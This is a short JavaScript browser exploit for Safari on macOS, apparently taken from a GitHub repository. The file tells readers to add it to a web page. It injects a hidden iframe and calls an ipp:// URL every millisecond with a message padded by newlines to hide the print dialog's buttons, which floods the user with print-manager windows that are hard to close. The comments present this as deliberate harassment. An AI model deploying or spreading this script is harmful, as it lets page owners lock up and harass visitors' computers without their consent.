/*
 Safari AddPrinter.exe URL scheme exploit
 
 Usage: Add this script to your page, and use: spamMessage(message)
 Works only in Safari for macOS.
 
 Also a pain for the user to remove... you have to hunt around in Activity Monitor!
 
 Created by Justin O'Boyle <justin@justinoboyle.com> (ISC license)
 Original source: https://github.com/justinoboyle/safari-exploits/blob/master/urlscheme/printsetup.js
*/

// No ES6... I know it hurts, but Safari has really bad support for it.
(function() {
    
    // Create a frame.
    var frame = document.createElement('iframe');
    frame.style = "display:none;outline:0;";
    document.body.appendChild(frame);
    frame.width = "0"
    frame.height = "0"

    // Quick and dirty way to generate a string of 100 newlines, a way to fa√ßade the print manager's buttons
    var newlineBuffer = (function() {
        var buffer = [];
        for (var i = 0; i < 100; i++)  
            buffer.push('\n');
        return buffer.join('');
    })();

    // API endpoint
    window.spamMessage = function(message) {
        // Do this every 1ms, because why not flood the queue and make it impossible to close? >:D
        setInterval(function() {
            // Open the print manager. Safari doesn't prompt you!
            frame.src = 'ipp://' + encodeURIComponent("\n\n" + message + newlineBuffer)
        }, 1);
    }

})();
